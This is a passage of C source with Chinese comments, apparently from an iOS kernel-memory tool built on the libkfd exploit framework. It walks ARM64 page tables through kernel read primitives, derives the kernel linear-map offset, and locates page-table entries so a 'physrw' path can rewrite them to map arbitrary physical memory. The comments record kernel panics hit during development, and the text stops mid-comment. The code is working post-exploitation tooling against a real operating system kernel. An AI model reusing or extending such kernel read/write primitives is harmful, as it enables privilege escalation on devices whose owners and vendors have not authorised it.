#define KM_L3_OFFMASK 0x0000000000003fffULL /* 14 bits，与 static_info.h:73 同值 */

/*
 * 落块 / 页描述符算最终 PA 用的掩码 = ARM_TTE_PA_MASK 再剔掉本级偏移位。
 *
 * 为什么必须 `& ~offmask`（perf.h:313）而不是直接用 ARM_TTE_PA_MASK：
 * 16KiB 页的 L3 页描述符里 bits 12–13 是**属性位**（AP 等），不是输出地址的
 * 高位；而 KM_TTE_PA_MASK（= static_info.h:55 ARM_TTE_PA_MASK）的 bit12–13
 * **恰好是 1**，直接与就把这两位当成地址拼进去，得到偏高 0x1000 / 0x2000 的
 * 错地址。KM_TTE_PA_MASK & ~0x3fff = 0x0000ffffffffc000，正好把它们剔除。
 *
 * 注意别改错地方：**表项** → 下一级表的地址用的是 ARM_TTE_TABLE_MASK
 * （bits 12..47，perf.h:317 就是这么用的），它与 KM_TTE_PA_MASK 同值，所以
 * 本工程写的 (entry & KM_TTE_PA_MASK) + g_linear_delta 是对的，不要动。
 * 只有**块 / 页描述符** → 最终 PA 这一处才需要 `& ~offmask`。
 */
#define KM_L1_PA_MASK (KM_TTE_PA_MASK & ~KM_L1_OFFMASK) /* = 0x0000fff000000000 */
#define KM_L2_PA_MASK (KM_TTE_PA_MASK & ~KM_L2_OFFMASK) /* = 0x0000fffffe000000 */
#define KM_L3_PA_MASK (KM_TTE_PA_MASK & ~KM_L3_OFFMASK) /* = 0x0000ffffffffc000 */

/*
 * pmap 开头就是 tte / ttep 两个指针：同一张顶层页表的 VA 与 PA 两个视图。
 *
 * 这给了 delta 一个不依赖页表遍历的来源，正是解开死结的关键 ——
 * 原来的 km_compute_linear_delta 要靠 walk 求 delta，而 walk 又要用 delta
 * 把下级表的 PA 补成 KVA，两者互为前提，所以永远解不出来（linear=unresolved）。
 * 直接拿 tte 减 ttep 就得到内核线性映射的 VA−PA 差值，一次 walk 都不需要。
 *
 * 这里**只定义 TTEP**，不再重复定义 TTE：KM_PMAP_TTE_OFFSET 在文件前部
 * 已经有一处定义（带 "/// struct pmap 的 tte 字段偏移" 注释那一行），先前
 * 在这里又写了一遍同值定义。同值宏当下合法、也不触发任何警告（C 允许替换
 * 列表完全相同的重复定义），但**同一个常量在文件里有两个定义点本身就是误导**：
 * 读的人分不清哪一处是真源，将来有人只改一处，轻则"改了没生效"，
 * 重则两处值不同变成真正的冲突重定义（那种错在编译期才炸，而且炸在
 * 引用它的行上，不是定义它的行上，很难查）。所以这里只补它缺的那个伙伴。
 */
#define KM_PMAP_TTEP_OFFSET 0x08

/// 内部：按 pmap 走页表，把 VA 翻成 PA。
///
/// **基准未验通（g_linear_map_valid 为假）时本函数一次内核读都不做**，
/// 直接返回 false —— 入口与下钻各有一道闸门，分工见下面两处注释。
/// 完整推导与两次 panic 的第一手证据见下钻处那段。
static bool km_page_table_walk(uint64_t pmap, uint64_t va, uint64_t *pa_out)
{
    if (pmap == 0 || pa_out == NULL) {
        return false;
    }

    /*
     * ── 入口闸门（第一道）──
     *
     * 它拦的是"**第一级读**"，也就是 `km_read64(pmap + 0x00)` 拿 tte、
     * 以及紧跟的 `km_read64(tte + index*8)` 拿顶层 entry。
     * 这两次读本身不用 delta，看着无害；但第二次读的地址是**由第一次读的结果
     * 算出来的**（tte 来自 pmap 那块内存的内容），也就是说：只要 pmap 指向的
     * 不是一张真 pmap —— 比如 info_run 的偏移错了、把某个别的结构体当成了 pmap
     * —— 这里就会拿一个从垃圾里读出来的值去当表地址，那是一个形态检查
     * （km_is_kernel_address）拦不住的地址。
     *
     * 而本函数在 g_linear_map_valid 为假时**无论如何都会失败**（下钻那道闸门
     * 决定的），所以入口早退的代价是零：不损失任何能成功的情形，
     * 只是把"注定失败"提前到不发任何 kread 的地方。
     * 取舍口径与整条读路径一致：读不出数据可以接受，多一次未验证的读不可以。
     *
     * 两道闸门的分工（别删任何一道）：
     *   · 这一道管"**要不要开始翻译**" —— 保证基准未验通时整条链路静默；
     *   · 下钻那一道管"**能不能拼地址**" —— 它是语义边界，将来若有人因为
     *     恢复 ptov_table 而放开入口，下钻那道仍然是最后一道兜底。
     * 反过来删掉这一道只留下钻那道，安全上仍然成立（下钻必被拦），
     * 代价是白做两次未验证的读 —— 所以留着它更合算。
     */
    if (!g_linear_map_valid) {
        return false;
    }

    bool ok = false;
    uint64_t tte = km_read64(pmap + KM_PMAP_TTE_OFFSET, &ok);
    if (!ok || tte == 0) {
        return false;
    }
    /*
     * 顶层表地址直接用 tte —— 它本身就是 KVA，而 km_read64 要的正是 KVA。
     *
     * 不能按 PA 字段掩码（KM_TTE_PA_MASK = 0x0000fffffffff000）截断：那个掩码
     * 是给**表项里的 PA 字段**用的，套到 KVA 上会把高 16 位清零，得到
     * 0x0000fe… 这种非内核地址，km_read64 的 km_is_kernel_address 立刻拒绝
     * —— 这就是原先 "pte: walk=FAIL" / "walk(kernel_proc)=MISS" 的直接原因。
     * （原先有一个 km_next_table_pa() 专门表达这一步掩码；顶层改成直写 tte、
     * 下级改成显式补 delta 之后它没有调用者了，定义已删 —— 留着只会触发
     * -Wunused-function。这段推理本身仍然成立，所以留着。）
     */
    uint64_t table = tte;

    /*
     * L1 / L2 允许块描述符直接落地；L3 只认页描述符。
     *
     * 循环上界是 `level <= 2` 而不是 `< 3`：数组只有 3 个元素，走到 L3 之后
     * 必须在这里收尾。**不能依赖"L3 一定是块描述符"这个形态巧合**——
     * 一旦 L3 表项的 bit1 为 1（表描述符形态），旧写法会继续下一轮，
     * 读到 masks[3] / shifts[3]（越界读栈内存），再拿垃圾索引去 km_read64。
     * 所以这个上界、以及循环体末尾那句 level == 2 的提前返回，都动不得。
     */
    const uint64_t shifts[3] = { KM_L1_SHIFT, KM_L2_SHIFT, KM_L3_SHIFT };
    const uint64_t masks[3] = { KM_L1_MASK, KM_L2_MASK, KM_L3_MASK };
    /*
     * 判据与掩码一律按级别取 —— 这是本层最关键的一处，理由见这些宏的定义处：
     * L3 的「是叶子」判据与 L1/L2 反相（bit1 = 1 才是叶），valid 也要求两位全 1；
     * offmask / PA 掩码同样逐级不同（大页偏移 + L3 属性位两个坑都在这）。
     */
    const uint64_t valid_masks[3] = { KM_TTE_VALID, KM_TTE_VALID, KM_PTE_TYPE_VALID };
    const uint64_t type_masks[3] = { KM_TTE_TYPE_MASK, KM_TTE_TYPE_MASK, KM_PTE_TYPE_MASK };
    const uint64_t type_blocks[3] = { KM_TTE_TYPE_BLOCK, KM_TTE_TYPE_BLOCK, KM_TTE_TYPE_L3BLOCK };
    const uint64_t pa_masks[3] = { KM_L1_PA_MASK, KM_L2_PA_MASK, KM_L3_PA_MASK };
    const uint64_t offmasks[3] = { KM_L1_OFFMASK, KM_L2_OFFMASK, KM_L3_OFFMASK };

    for (int level = 0; level <= 2; level++) {
        uint64_t index = (va & masks[level]) >> shifts[level];
        uint64_t entry = km_read64(table + index * sizeof(uint64_t), &ok);
        if (!ok || (entry & valid_masks[level]) != valid_masks[level]) {
            return false;
        }

        /*
         * 块 / 页描述符命中即为叶子，剩下的就是算术，与上游 perf.h:312-314
         * 逐字对应：
         *     pa = ((tte & ARM_TTE_PA_MASK & ~offmask) | (va & offmask));
         * 两半都不能省，各自对应一个真实的坑：
         *   `& pa_masks[level]`：先把该级的级内偏移位剔掉。L3 的 bits 12–13
         *       是属性位，被 KM_TTE_PA_MASK 当成地址高位就会算高 0x1000/0x2000；
         *   `| (va & offmasks[level])`：级内偏移只能从 VA 取 —— 块 / 页描述符
         *       里存的是块首 / 页首，本来就不含这部分。L1 / L2 大页（64GiB /
         *       32MiB）丢掉的正是它，内核线性映射区常用大页，所以真会算错。
         * 旧写法三级共用 KM_TTE_PA_MASK + KM_PAGE_MASK，上两坑各中一个。
         */
        if ((entry & type_masks[level]) == type_blocks[level]) {
            *pa_out = (entry & pa_masks[level]) | (va & offmasks[level]);
            return true;
        }

        /*
         * 走到最后一级还不是叶子：L3 的 bit1 = 0 既不是页描述符，也不允许再
         * 开表（L3 之下无处可去），判失败。
         *
         * 注意这句已经**不再是** L3 的收尾逻辑 —— L3 的页描述符在上面那条
         * 类型判据里就被认下来并 return true 了。先前写反了判据，L3 叶子
         * 永远落到这里返回 false，才表现为"任何下钻到 L3 的翻译都失败"。
         * 现在它只剩边界保护这一个职责：masks / shifts / 各掩码都只有 3 个
         * 元素，不在这里收手，下一轮就会读 masks[3] / shifts[3]（越界读栈）。
         */
        if (level == 2) {
            return false;
        }

        /*
         * ── 下钻闸门：拼地址之前必须确认基准可信（本次止损的第二处，唯一的安全边界）──
         *
         * 为什么必须拦在**这里**，而不是只靠调用方入口那四处闸门：
         * km_translate / km_read_process / km_write_process（该入口现已删除）/
         * km_self_test 入口
         * 查的都是 g_linear_map_valid —— 那只能证明"调用者知道基准没验通"，
         * **不能证明 g_linear_delta 里没有脏值**。b581819 那次就是在四处入口
         * 都挂上闸门之后仍然彩屏的：污染源 bootstrap 在闸门之外，把
         * tte − ttep 写进了全局，而四条 km_compute_linear_delta 路径的第一句
         * 就是 km_page_table_walk，于是"打开就打"。
         * 一句话：闸门只能挡被检查的那一处，挡不住数据流 ——
         * 所以闸门要挂在**使用点**上，也就是这一行前面。
         *
         * 拦法：g_linear_map_valid 为假就直接返回失败，不去拼地址。
         * 依据是 g_linear_delta 声明处那条不变式（!valid ⟹ delta == 0）
         * 再加上 km_read64 自己的形态检查，两者合起来才是安全失败：
         *   · delta == 0 时 table = entry & KM_TTE_PA_MASK，而 KM_TTE_PA_MASK
         *     (0x0000fffffffff000) 的**高 16 位恒为 0** → km_is_kernel_address
         *     的 `(addr>>48)==0xFFFF` 必假 → km_read64 直接返回 ok=false
         *     → walk 失败。这就是 4d863fc 时代之所以没出事的机制：
         *     那时 delta 恒为 0，每条下钻都被这道形态检查拦掉。
         *   · 可疑值（非 0、形态又像内核地址）会让形态检查**放行**，
         *     内核抱着未映射地址去解引用 → 彩屏。第二次 panic 的 far
         *     (0xfffffe1564a385b4, DFSC=6 level 2) 就是这个形态。
         * 所以"0 是安全的、错值不是"，这道闸门就是把这个区别写进代码。
         *
         * 代价（刻意接受，与"宁可把整条内核读路径全废掉"一致）：
         * 四条 km_compute_linear_delta 路径本身要靠 walk 才能求出 delta，
         * 而 walk 下钻又要求 delta 已可信 —— 这是个**闭环**。闸门生效之后，
         * 设备上会稳定落到 linear=unresolved，km_read_process / km_write_process
         * （后者现已删除）一律直接失败。这是**预期安全态，不是故障**：读不出数据可以接受，
         * 把无效地址送进内核解引用不可以。
         * 要打破这个闭环，得让 delta 有一个**不依赖 walk 的可信来源**：
         * 即 ptov_table 的等价物（上游 perf.h:232-248 的 8 项分段表，
         * 逐段判 tp_virt / tp_virt_end），或者至少逐段交叉校验。
         * 那是独立课题，不能用"一次相减"冒充。
         *
         * 附注：入口闸门生效时这个分支**到不了**（函数在入口就返回了）。
         * 留在这里不是冗余 —— 它是"拼地址必须有可信 delta"这条规则本身：
         * 入口那道管"要不要开始翻译"（当前状态下的整体静默），
         * 这道管"能不能拼地址"（语义边界）。将来有人因为恢复 ptov_table
         * 而放开入口闸门，这一条也不能被顺带放开。
         */
        if (!g_linear_map_valid) {
            return false;
        }

        /*
         * 走到这里 delta 才是可信的，可以补 KVA 了。
         *
         * 下级表的地址是**物理地址**，必须经线性映射补回 KVA 才能 km_read64。
         *
         * 改正一笔旧注释的错：先前这里写"不需要再挂 g_linear_map_valid 闸门，
         * 因为两个调用者（km_translate 与 km_compute_linear_delta）都在入口查过了，
         * 而 km_page_table_walk 只从这两处进来" —— 三处都站不住：
         *   ① 调用者其实是四处（还有 km_self_test 里的两处调用）；
         *   ② 调用者入口的闸门管的是"调用者自己要不要下探"，管不了全局变量
         *      在别处被写脏（bootstrap 正是那个"别处"）；
         *   ③ 更根本的：安全边界应该落在**使用点**。"离得近的调用者查过了"
         *      这种论证会在下一次重构里立刻失效，而失效的代价是内核彩屏。
         * 顺带记一笔更早的错：这个位置曾经写"g_linear_delta 由
         * km_bootstrap_linear_delta() 从 pmap 的 tte/ttep 直接求出，所以不会
         * 出现 delta 还没算出来"，把那个自举当成可信来源 —— 分段映射的事实
         * 让这个前提不成立，见 km_bootstrap_linear_delta 的注释。
         */
        table = (entry & KM_TTE_PA_MASK) + g_linear_delta;
    }

    return false;
}

/*
 * 与 km_page_table_walk 平行的一条路：走到最后一级后**返回那条页表项自身**
 * 的物理地址，而不是它描述的数据页。
 *
 * physrw 要的是前者 —— 拿到 PTE 的 PA 之后经线性映射补回 KVA，再用 kwrite
 * 改它，就能让任意 VA 指向任意物理页。
 *
 * 两个函数刻意分开：walk 是热路径（每次 km_read_process 都要走），
 * 多算一个 PTE 地址是白费；这个函数每次改写才用一次。
 *
 * 与 walk 一致的约定：L1 / L2 遇到块描述符就返回 false
 * —— 那种情况下没有独立的 L3 表项可改。
 * （块大小别按 4 KB 粒度记：16 KB 粒度下 L1 块是 2^36 = 64 GiB、
 *   L2 块是 2^25 = 32 MiB，见 static_info.h:62 / :67 的 ARM_16K_TT_L*_SIZE。
 *   这里原先写的是 "1GB / 32MB"，1 GB 是 4 KB 粒度下的 L1 块，不是本工程的几何。）
 */
static bool km_pte_for(uint64_t pmap, uint64_t va, uint64_t *pte_pa_out)
{
    if (pmap == 0 || pte_pa_out == NULL) {
        return false;
    }

    /*
     * 入口闸门，与 km_page_table_walk 的第一道同型同因（那边有完整注释）：
     * 基准未验通时整条翻译一次 kread 都不发。这里拦的是
     * `km_read64(pmap + 0x00)` 拿 tte，以及用它算出来的 `tte + index*8` ——
     * 后者的地址来自第一次读的结果，pmap 若不是真 pmap，这个地址就无从验证。
     * 而本函数在基准未验通时注定失败（下钻那道闸门决定的），所以早退零代价。
     */
    if (!g_linear_map_valid) {
        return false;
    }

    bool ok = false;
    uint64_t tte = km_read64(pmap + KM_PMAP_TTE_OFFSET, &ok);
    if (!ok || tte == 0) {
        return false;
    }
    /* 顶层同 km_page_table_walk：tte 是 KVA，不能按 PA 掩码截断 */
    uint64_t table = tte;

    const uint64_t shifts[3] = { KM_L1_SHIFT, KM_L2_SHIFT, KM_L3_SHIFT };
    const uint64_t masks[3] = { KM_L1_MASK, KM_L2_MASK, KM_L3_MASK };

    for (int level = 0; level < 3; level++) {
        uint64_t index = (va & masks[level]) >> shifts[level];
        uint64_t entry_pa = table + index * sizeof(uint64_t);

        /* 最后一级：这条就是我们要改的 PTE 自己 */
        if (level == 2) {
            uint64_t entry = km_read64(entry_pa, &ok);
            if (!ok || (entry & 1) == 0) {
                return false;
            }
            *pte_pa_out = entry_pa;
            return true;
        }

        uint64_t entry = km_read64(entry_pa, &ok);
        if (!ok || (entry & 1) == 0) {
            return false;
        }
        if ((entry & KM_TTE_TYPE_MASK) == KM_TTE_TYPE_BLOCK) {
            /* 大页没有独立 L3 表项，physrw 这条路对它无效 */
            return false;
        }

        /*
         * 与 km_page_table_walk 同一条闸门，理由也一样（那里的注释有完整推导
         * 与两次 panic 的证据，不在这里重复）：下钻要拼 `PA + g_linear_delta`，
         * 而 g_linear_delta 只在 g_linear_map_valid 为真时才有定义值。
         * 基准没验通时，delta == 0 会让地址退化成 PA —— 高 16 位恒 0，
         * km_is_kernel_address 必拒，是安全失败；而一个"看似合法的错值"会被
         * 形态检查放行，内核抱着未映射地址解引用 → 彩屏。
         *
         * 本函数只有 km_self_test 一个调用者，而那里外层已经查过
         * g_linear_map_valid —— 但闸门仍然挂在这里：安全边界必须落在使用点，
         * 依赖调用方前置条件的那种论证在 b581819 那次已经被证明会漏
         * （闸门齐全、数据被污染，照样彩屏）。
         */
        if (!g_linear_map_valid) {
            return false;
        }

        /* 下级表地址是 PA，补回 KVA */
        table = (entry & KM_TTE_PA_MASK) + g_linear_delta;
    }

    return false;
}

/**
 * 从 pmap 自身的 tte / ttep 读出内核线性映射的 VA−PA 差值**候选值**。
 *
 * pmap 开头的两个字段是同一张顶层页表的两个视图：tte 是它的内核 VA，
 * ttep 是它的 PA，两者相减确实是一个真实存在的 VA−PA 差值，而且这一步
 * 不依赖任何页表遍历 —— 这是它当初被选来自举的原因（walk 要 delta、
 * delta 又要 walk，那个死结靠它解开）。
 *
 * ============ 但**绝不能**据它置位 g_linear_map_valid ============
 *
 * 它只对「顶层页表所在的那一段映射」成立，不是全地址恒定的偏移。
 * 上游 libkfd 自己的 phystokv()（Aether/libmemrw/kfd/libkfd/perf.h:232-248）
 * 用的是 **8 项分段的 ptov_table**：逐项比对 tp_virt / tp_virt_end 落在哪一段，
 * 取该段自己的 tp_phys 算偏移，只有全部落空才退回单一 delta 兜底 ——
 * 换句话说，"单一偏移对全地址恒定"这个前提，连参考实现都不承认。
 *
 * 拿一个段的差值去换算段外的物理页，得到的就是**段外某处的地址**：它既不是
 * 目标页，也未必落在内核映射区里。设备上的 panic 正是这条路的终点（bug_type 210）：
 *     panic(cpu 6): Kernel data abort at pc 0xfffffe001c488350
 *       x0:  0xfffffe13e679c000      <- 结构指针（有效）
 *       x8:  0xfffffbd9bcda66e4      <- 坏指针
 *       far: 0xfffffbd9bcda66ec      <- = x8 + 8
 *       esr: 0x96000005 (DFSC=5, level 1 translation fault)
 *   far 低于 VM_MIN_KERNEL_ADDRESS（0xfffffe0000000000），说明内核是抱着一个
 *   **不在内核映射区**的地址去取数的；而本工程的读路径 kread_sem_open 必须先把
 *   目标地址写进本进程 psemnode 的 pinfo，再由内核按内核语义解引用 ——
 *   送进去的地址映射不存在，fault 就发生在内核态，必然彩屏重启。
 *
 * 所以这里保留读值与诊断输出（tte / ttep / delta 对排查仍有价值，彩屏之后
 * 这几个数字是唯一能反推"当时用了什么基准"的证据），但**不置 valid**：
 * 只有 return true 时它才是可信基准，而这条函数的实现里永远不返回 true。
 * 要真正让 pmap 自举可用，得实现 ptov_table 的等价物（读内核里的
 * ptov_table 符号，或至少逐段交叉校验），那是独立课题，不能用"一次相减"
 * 冒充。
 *
 * 至于下面那些基于 walk 的路由（km_compute_linear_delta）为什么仍然保留：
 * 它们的 delta 来自**一次真实观测 + 成对一致性判据**（见该函数注释），
 * 与 tte − ttep 那种"假设段内偏移能外推"的形态不是一回事。
 */
static bool km_bootstrap_linear_delta(uint64_t pmap, char *out, size_t outSize)
{
    if (pmap == 0) {
        if (out && outSize) {
            snprintf(out, outSize, "pmap is 0");
        }
        return false;
    }

    bool ok_tte = false;
    bool ok_ttep = false;
    const uint64_t tte  = km_read64(pmap + KM_PMAP_TTE_OFFSET,  &ok_tte);
    const uint64_t ttep = km_read64(pmap + KM_PMAP_TTEP_OFFSET, &ok_ttep);

    if (!ok_tte || !ok_ttep || tte == 0 || ttep == 0) {
        if (out && outSize) {
            snprintf(out, outSize, "pmap tte/ttep unreadable (tte=%#llx ttep=%#llx)",
                     (unsigned long long)tte, (unsigned long long)ttep);
        }
        return false;
    }
    if (tte <= ttep) {
        if (out && outSize) {
            snprintf(out, outSize, "implausible tte<=ttep (%#llx <= %#llx)",
                     (unsigned long long)tte, (unsigned long long)ttep);
        }
        return false;
    }

    /*
     * ↓↓↓ 本次止损的第一处：这里曾经是 `g_linear_delta = tte - ttep;` ↓↓↓
     *
     * 上面那段"不能据它置 g_linear_map_valid"讲的是**闸门**，这一行是**污染源**，
     * 两件事必须分开堵：b581819 那次止损只堵了闸门（四处入口查 g_linear_map_valid），
     * 却把算出来的差值原地写进了全局变量 —— 而闸门只挡被检查的那一处，
     * 挡不住已经落在 g_linear_delta 里的脏值，其它读者照样会踩上它。
     *
     * 谁踩上它：km_page_table_walk / km_pte_for 的下钻那一行
     *     table = (entry & KM_TTE_PA_MASK) + g_linear_delta;
     * 而 km_locate_linear_map 在 km_init 里**必然执行**，且顺序是
     * 「先 bootstrap（把错值写进全局）→ 再走四条 km_compute_linear_delta 路径」，
     * 四条路径的第一步都是 km_page_table_walk，于是**一打开就踩着脏 delta 下钻**。
     *
     * 这就是第二次彩屏（b581819 的包）的机制。两次 panic 的第一手证据对照：
     *
     *   第一次（8cbf715 的包，delta 是 bootstrap 算的错值）：
     *     panic ... Kernel data abort. at pc 0xfffffe001c488350
     *       x0:  0xfffffe13e679c000      x8:  0xfffffbd9bcda66e4
     *       esr: 0x96000005              far: 0xfffffbd9bcda66ec   (= x8 + 8)
     *     far 低于 VM_MIN_KERNEL_ADDRESS(0xfffffe0000000000)，DFSC=5 → level 1 fault。
     *
     *   第二次（b581819 的包，闸门已加、污染源没堵）：
     *     panic(cpu 4 caller 0xfffffe0017878c24): Kernel data abort. at pc 0xfffffe0017640350
     *       x0:  0xfffffe113b498000      x8:  0xfffffe1564a385ac
     *       esr: 0x96000006              far: 0xfffffe1564a385b4   (= x8 + 8)
     *     这一次 x8 / far 都是**看起来合法的内核地址**（≥ VM_MIN_KERNEL_ADDRESS），
     *     DFSC=6 → level 2 fault：打到了内核地址空间里的**空洞**。
     *     km_is_kernel_address 的 `(addr>>48)==0xFFFF` 检查对这类地址**放行**，拦不住。
     *
     * 两处 `far = x8 + 8` 的形态说明：x8 就是被送进 kread_sem_open 的那个目标地址
     * （内核在它的 +8 偏移上取数），也就是说这正是下钻算出来的 table。
     *
     * 关键对照 —— 为什么"止损前"反而更安全，以及为什么 0 是安全的：
     *   4d863fc 时代 bootstrap 不存在，g_linear_delta 恒为 0，下钻退化成
     *   `table = entry & KM_TTE_PA_MASK`；而 KM_TTE_PA_MASK (0x0000fffffffff000)
     *   的**高 16 位恒为 0**，`(addr >> 48) == 0xFFFF` 必假 → km_read64 当场
     *   返回 ok=false → 整条 walk 失败。安全失败，不会进内核解引用。
     *   换句话说：**0 会被形态检查拦下，一个"看似合法的错值"不会。**
     *   于是"把 0 换成 tte − ttep"这个动作，等于把唯一的保护机制从
     *   "必被拒绝"改成了"必被放行" —— 这比不修更危险，是本次要写死的教训。
     *
     * 所以这里的处置是：算出来的值**只进 note 供排查**，绝不落到全局。
     * g_linear_delta 的写入点只剩 km_compute_linear_delta（成功且过形态判据）
     * 与 km_locate_linear_map 入口的复位，全局不变式因此成立：
     *     !g_linear_map_valid  ⟹  g_linear_delta == 0
     */
    const uint64_t candidate = tte - ttep;
    if ((candidate >> 40) == 0) {
        if (out && outSize) {
            snprintf(out, outSize, "implausible candidate delta %#llx (未采信)",
                     (unsigned long long)candidate);
        }
        return false;
    }

    /*
     * 注意这条 `>> 40 != 0` 的判据挡不住段外换算 —— 它只说明"这个差值够大"
     * （真内核映射区的偏移确实大），不说明"它对全地址成立"。一段偏移完全可能
     * 通过这个形态检查，却被用到另一段的物理页上，算出一个映射区外的地址。
     * 所以下面即使返回 true，语义也只是"读到了自洽的候选值"，不是"可信基准"；
     * 判据的不足由调用方「不置 g_linear_map_valid」来兜。
     *
     * 而 candidate 从这一版起**只进 note**：它连"候选基准"都不算 ——
     * 函数返回 true 的含义已经收窄成"pmap 的 tte/ttep 读出来了、形态看着正常"，
     * 供 km_locate_linear_map 打一行日志。全局变量一个字都不动。
     */
    if (out && outSize) {
        snprintf(out, outSize, "candidate tte=%#llx ttep=%#llx delta=%#llx (未采信)",
                 (unsigned long long)tte, (unsigned long long)ttep,
                 (unsigned long long)candidate);
    }
    return true;
}

/*
 * 用一次真实观测求 delta：先走页表把 known_va 翻成 pa，再相减。
 *
 * 与 tte − ttep 的区别（为什么这条**可以**置 valid，那条不可以）：
 *   - tte − ttep 是**一个段内的偏移当成常数外推**，段外没有任何校验；
 *   - 这里用的是「上游 phystokv() 兜底那一支的等价物」——perf.h:232-248 在
 *     8 项分段全落空之后也是 `virt = gVirtBase + pa + (gPhysBase − gVirtBase)`，
 *     即"先按段判、判不出才退回单一偏移"。本工程没有读 ptov_table，于是把
 *     观测锚点放在内核 VA（kernel_proc / current_proc）上：它们与下游要换算的
 *     目标同处内核 image 段，段内偏移一致；而那次 walk 成功本身就意味着各级
 *     表项都已 valid、描述符形态合法，也就是 pa 与 known_va 描述同一页
 *     —— 一个已验证过的成对观测。所以它给出的 delta 至少在"内核 image 段内"
 *     是自洽的。
 *
 * 前提也要写清（不能装作没有）：它同样只在**内核 image 段内**有据可查。
 * 跨到别的段（比如把某个非 image 段的物理页补回 KVA）依然会偏 ——
 * 那一段只能靠 ptov_table 逐段判，属于同一门独立课题。区别在于：这条路
 * 最坏是"段外算偏"，而不是"段外地址直接被喂进内核解引用"—— 因为它的锚点
 * 是一个已经被 walk 验证过的真地址，delta 的形态（>> 40 非 0）说明它至少
 * 落在内核映射区里。
 *
 * ── 但在当前闸门之下，这条路径在设备上**不可能成功** ──
 *
 * 它第一步就是 km_page_table_walk，而 walk 在下钻处要求 g_linear_map_valid
 * 已经为真（见那里闸门的注释）；而 valid 正是本函数成功之后才由调用方置位的。
 * 所以上面那句"为什么这条可以置 valid"是**条件性**的结论：前提是 walk 能走通，
 * 而 walk 现在走不通 —— 这是刻意接受的闭环，完整推导见 km_locate_linear_map
 * 里那段"四条路由会稳定失败"。
 * 之所以保留（而不是删掉）这段推理：它记的是"什么样的 delta 来源才配叫可信"
 * —— 一次真实观测 + 成对一致性，而不是一次相减外推。将来实现 ptov_table
 * 的等价物时，这份判据依然有效，届时本条路径会重新可用。
 *
 * 另外记一笔当前状态下的实际行为：闸门生效时本函数每次调用最多做两次
 * km_read64（读 pmap + 0x00 拿 tte、读顶层表里那一条 entry），两次地址都来自
 * 内核自己写下的数据，然后在下钻处失败返回。
 */
static bool km_compute_linear_delta(uint64_t pmap, uint64_t known_va,
                                    const char *reason, char *out, size_t outSize)
{
    /*
     * 入口先复位全局（本次止损补的第二道保险）。
     *
     * 为什么放在这里：本函数有**三条**失败出口（walk 失败 / pa 为 0 /
     * 差值形态不合理），而先前只有成功那条会写 g_linear_delta —— 看着没事，
     * 其实留下了一个空洞：只要有任何一条路径（历史上的 bootstrap 就是）先
     * 把脏值写进去，这里的失败分支就会把它**原样留在全局里**，而调用方
     * km_locate_linear_map 只会保持 g_linear_map_valid == false。
     * 结果就是"valid 为假、delta 却是脏值"这个最危险的组合 ——
     * 它正是 km_page_table_walk 下钻能踩上的前提。
     *
     * 复位放最前面，三条失败出口就都自动覆盖到了；成功路径在后面重新写。
     * 这个顺序在单线程上无副作用：km_init 全程跑在同一个后台队列里，
     * 而 g_kernel_ready 要等 km_init 结束才置位（见其声明处的注释）。
     */
    g_linear_delta = 0;

    uint64_t pa = 0;
    if (!km_page_table_walk(pmap, known_va, &pa)) {
        if (out && outSize) {
            snprintf(out, outSize, "%s: walk failed", reason);
        }
        return false;
    }
    if (pa == 0) {
        if (out && outSize) {
            snprintf(out, outSize, "%s: pa is 0", reason);
        }
        return false;
    }
    /*
     * 先算成局部候选值，**过了形态判据才落全局**。
     *
     * 别写成 `g_linear_delta = known_va - pa;` 再判 —— 那样判据不过时脏值
     * 已经躺在全局里了（bootstrap 那一行就是这个写法，见它的注释）。
     * 形态判据的正面作用很有限（只说明差值够大，不说明它对全地址成立），
     * 但它至少是一道"进全局之前的门"，值不值得把关另说，门必须在。
     */
    const uint64_t candidate = known_va - pa;
    if ((candidate >> 40) == 0) {
        if (out && outSize) {
            snprintf(out, outSize, "%s: implausible delta %#llx",
                     reason, (unsigned long long)candidate);
        }
        return false;
    }
    g_linear_delta = candidate;
    if (out && outSize) {
        snprintf(out, outSize, "%s: delta=%#llx", reason,
                 (unsigned long long)g_linear_delta);
    }
    return true;
}

bool km_locate_linear_map(void)
{
    g_linear_map_valid = false;
    g_linear_delta = 0;

    if (g_handle == 0) {
        return false;
    }

    struct kfd *kfd = (struct kfd *)g_handle;
    g_current_pmap = kfd->info.kaddr.current_pmap;

    /*
     * 内核 VA 必须用 kernel_pmap 走。
     *
     * kernel_proc / current_proc 都是内核虚拟地址，早先这里用 current_pmap
     * （用户进程的 pmap）去 walk 它们 —— 语义就是错的：用户 pmap 的页表里
     * 没有内核空间的映射，要么走不通，要么走到一张不相干的表上，算出的
     * delta 自然也不成立。而 delta 一旦不成立，km_pte_for 补回来的 KVA 就
     * 指向别处。
     *
     * 这里优先用 kernel_pmap；它没填上（info_init 只在 kernel_proc 非 0 时
     * 才填）或走不通时，再退到原来的 current_pmap 路径 —— 只加不删，
     * 避免把原本能跑通的环境弄坏。
     */
    const uint64_t kpmap = kfd->info.kaddr.kernel_pmap;

    char note[192] = {};

    /*
     * pmap 的 tte / ttep 只**读出来给排查用**，不当基准用。
     *
     * 这一步不依赖页表遍历，在"walk 要 delta、delta 又要 walk"那个死结下看着
     * 很诱人（设备上早先的表现就是 pte: walk=FAIL、walk(kernel_proc)=MISS pa=0、
     * linear=unresolved、self-read FAIL）。但 tte − ttep 只是顶层表所在那一段
     * 的偏移，不是全地址恒定的 delta（理由与 panic 证据见
     * km_bootstrap_linear_delta 的注释），拿它当基准就是把段外地址喂给 kread，
     * 而那条路的终点是彩屏重启。
     *
     * 所以这里**不置 g_linear_map_valid**，只把读数记进日志，然后继续走下面
     * 基于 walk 的路由。全部落空时整个函数返回 false —— 那是**预期的安全状态**：
     * 读不出数据可以接受，把无效地址送进 kread 不可以（三处读路径入口的
     * g_linear_map_valid 闸门由此生效）。
     *
     * 明确写下来：因此**不要**为了让这里返回 true 而把单段差值补成 valid。
     * 真要让 pmap 自举可用，得实现 ptov_table 的等价物 —— 独立课题。
     *
     * ── 本次止损之后，下面四条基于 walk 的路由在设备上会**稳定失败** ──
     *
     * 这是刻意接受的后果，不是需要"修好"的故障。链条是：
     *   bootstrap 不再写 g_linear_delta（它连候选值都不落全局）
     *   → 四条 km_compute_linear_delta 的 delta 要靠 km_page_table_walk 求
     *   → walk 下钻那里现在有硬闸门，要求 g_linear_map_valid 已经为真
     *   → 而 valid 只能由这四条路径的成功来置位
     * 也就是一个闭环。最终稳定落在：valid == false、delta == 0、
     * km_read_process / km_write_process 一律直接失败。
     * 上一版止损（b581819）留下的状态是"四条路径会带着脏 delta 下钻"，
